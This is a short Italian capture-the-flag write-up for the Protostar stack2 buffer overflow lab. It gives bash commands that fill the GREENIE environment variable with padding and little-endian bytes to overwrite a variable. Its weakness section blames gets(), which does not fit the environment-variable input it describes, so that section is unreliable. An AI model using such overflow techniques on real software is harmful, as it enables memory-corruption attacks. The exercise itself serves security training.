# Protostar_stack 2 - Buffer overflow

## Obiettivo della sfida
Impostare il valore di _modified_ a **0x0d0a0d0a**
a tempo di esecuzione

## Raccolta informazioni
Il programma _stack2_ accetta input locali tramite una variabile d'ambiente **GREENIE**, essa non esiste quindi va creata. La stringa 0x0d0a0d0a corrisponde a "\r\n\r\n"

## Strategia d'attacco
Creiamo la variabile d'ambiente **GREENIE**, la riempiamo inizialmente con 64 'a' e alla fine aggiungiamo la stringa 0x0a0d0a0d (ricordiamoci che l'architettura è little endian) 

### Istruzioni da eseguire
```bash
> cd /opt/protostar/bin
> GREENIE=$(python -c 'print "a" * 64 + "\x0a\x0d\x0a\x0d"')
> echo $GREENIE
# verifichiamo che la stringa sia corretta
> ./stack2
# sfida vinta
```

## Debolezze
1. `gets()` non effettua controlli sul buffer overflow

## Mitigazione
1. sostituire la funzione`gets()` con `fgets()`
